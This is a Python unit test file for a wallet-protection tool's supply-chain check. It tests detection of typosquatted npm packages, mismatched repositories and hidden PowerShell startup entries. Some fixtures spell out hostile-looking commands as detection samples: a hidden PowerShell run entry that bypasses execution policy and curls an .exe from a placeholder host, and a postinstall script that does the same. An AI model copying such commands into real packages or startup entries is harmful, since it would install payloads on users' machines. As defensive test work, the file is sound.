"""Synthetic metadata only: no live PC inspection, network or package execution."""
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from walletguard import supply_chain as sc


RULES = {'rea-agents': {'repositories': ['github.com/morluto/rea'], 'publishers': ['official-fixture']}}


class SupplyChainTests(unittest.TestCase):
    def assess(self, **changes):
        package = {'name': 'rea-agents', 'path': r'C:\packages\package.json',
                   'repository': 'github.com/morluto/rea'}
        package.update(changes)
        return sc.assess([package], [], RULES)

    def test_official_and_missing_metadata_are_quiet(self):
        self.assertEqual(self.assess(), [])
        self.assertEqual(self.assess(repository='', publisher=''), [])

    def test_typos_and_scope_imitation(self):
        for name in ('rea-agnts', 'rea-agentss', 'rea-agenta', 'rea-agetns', '@fake/rea-agents'):
            with self.subTest(name=name):
                self.assertEqual(self.assess(name=name)[0].severity, 'medium')
        self.assertEqual(self.assess(name='react'), [])

    def test_source_and_publisher_mismatch(self):
        self.assertEqual(self.assess(repository='github.com/fake/rea')[0].severity, 'medium')
        self.assertEqual(self.assess(publisher='unknown')[0].severity, 'medium')

    def test_multiple_indicators_required_for_high(self):
        self.assertEqual(self.assess(recent=True, shell=True)[0].severity, 'medium')
        self.assertEqual(self.assess(recent=True, shell=True, download=True)[0].severity, 'medium')
        self.assertEqual(self.assess(name='rea-agnts', recent=True, shell=True, download=True)[0].severity, 'high')
        self.assertEqual(self.assess(recent=False, shell=True, download=True), [])

    def test_dev_tools_stay_low_until_indicators_agree(self):
        for path in (r'C:\dev\rea\package.json', r'C:\tools\CutShit\package.json',
                     r'C:\tools\Ollama\package.json', r'C:\tools\Electron\package.json'):
            self.assertEqual(self.assess(path=path, recent=True, shell=True, download=True)[0].severity, 'low')
            self.assertEqual(self.assess(path=path, name='rea-agnts', recent=True, shell=True, download=True)[0].severity, 'high')
        self.assertFalse(sc.trusted_dev(r'C:\developer\x'))

    def test_run_scripts_and_no_command_disclosure(self):
        entry = {'source': 'HKCU fixture', 'index': 2,
                 'command': r'powershell -WindowStyle Hidden -File C:\Users\owner\task.ps1 -Token SENTINEL'}
        findings = sc.assess([], [entry], RULES)
        self.assertEqual(findings[0].severity, 'medium')
        self.assertNotIn('SENTINEL', str(findings[0].to_dict()))
        entry['command'] = r'pwsh -WindowStyle Hidden -File C:\dev\task.ps1'
        self.assertEqual(sc.assess([], [entry], RULES)[0].severity, 'low')
        entry['command'] = r'pwsh -File C:\dev\task.ps1'
        self.assertEqual(sc.assess([], [entry], RULES), [])
        entry['command'] = r'pwsh -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\owner\task.ps1; curl https://example.invalid/a.exe'
        self.assertEqual(sc.assess([], [entry], RULES)[0].severity, 'high')

    def test_collector_projects_only_metadata_and_does_not_execute(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            package = root / '@fake' / 'rea-agents'
            package.mkdir(parents=True)
            manifest = package / 'package.json'
            manifest.write_text(json.dumps({'name': '@fake/rea-agents',
                'repository': {'url': 'git+https://user:SENTINEL@github.com/fake/rea.git?token=SENTINEL'},
                'scripts': {'postinstall': 'powershell curl https://example.invalid/a.exe SENTINEL'},
                'unrelated': 'SENTINEL'}), encoding='utf-8')
            (package / '.npmrc').write_text('DO NOT READ', encoding='utf-8')
            with patch('subprocess.run', side_effect=AssertionError('must not execute')):
                packages, errors = sc.collect_packages([root], now=manifest.stat().st_mtime)
            self.assertEqual(errors, 0)
            self.assertEqual(len(packages), 1)
            self.assertTrue(packages[0]['recent'])
            self.assertTrue(packages[0]['shell'])
            self.assertTrue(packages[0]['download'])
            self.assertEqual(packages[0]['repository'], 'github.com/fake/rea')
            self.assertNotIn('SENTINEL', str(packages))
            self.assertEqual(sc.assess(packages, [], RULES)[0].severity, 'high')

    def test_malformed_large_and_nested_metadata(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for name, contents in (('broken', '{'), ('large', ' ' * (sc.LIMIT + 1)), ('wrong', '[]')):
                folder = root / name
                folder.mkdir()
                (folder / 'package.json').write_text(contents)
            nested = root / 'broken' / 'node_modules' / 'ignored'
            nested.mkdir(parents=True)
            (nested / 'package.json').write_text('{"name":"rea-agnts"}')
            packages, errors = sc.collect_packages([root])
            self.assertEqual(packages, [])
            self.assertEqual(errors, 3)

    def test_repo_fixture_and_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            manifest = Path(tmp) / 'package.json'
            manifest.write_text('{"name":"rea-agents","repository":"https://github.com/fake/rea"}')
            packages, errors = sc.collect_packages([], repo_manifests=[manifest])
            self.assertEqual(errors, 0)
            self.assertEqual(sc.assess(packages, [], RULES)[0].severity, 'medium')
            with patch.object(sc, 'MAX_PACKAGES', 0):
                self.assertEqual(sc.collect_packages([], repo_manifests=[manifest])[1], 1)

    def test_redirected_package_is_not_opened(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            package = root / 'redirected'
            package.mkdir()
            (package / 'package.json').write_text('{"name":"rea-agnts"}')
            original = sc._redirected
            with patch.object(sc, '_redirected', side_effect=lambda p: p == package or original(p)):
                with patch.object(sc, '_read_json', side_effect=AssertionError('must not open')):
                    self.assertEqual(sc.collect_packages([root]), ([], 0))

    def test_windows_script_host_hidden_option(self):
        entry = {'command': r'wscript //B C:\Users\owner\startup.vbs'}
        self.assertEqual(sc.assess([], [entry], RULES)[0].severity, 'medium')

    def test_check_uses_collector_projection_and_reports_incomplete_coverage(self):
        with patch.dict('os.environ', {}, clear=True), \
                patch.object(Path, 'is_dir', return_value=False), \
                patch.object(sc, '_read_json', return_value=RULES), \
                patch.object(sc, 'collect_packages', return_value=([], 1)), \
                patch.object(sc, 'read_run_entries', return_value=([], 0)):
            findings = sc.check()
        self.assertEqual([f.severity for f in findings], ['low'])
        self.assertIn('incomplete', findings[0].title)
        self.assertTrue(findings[0].fix)

    def test_scan_registration(self):
        from walletguard.scanner import CHECKS
        self.assertIn(('supply chain', sc.check), CHECKS)

    def test_all_findings_have_fix_and_false_positives(self):
        for finding in self.assess(name='rea-agnts'):
            self.assertTrue(finding.fix)
            self.assertIn('Known false positives', finding.detail)


if __name__ == '__main__':
    unittest.main()
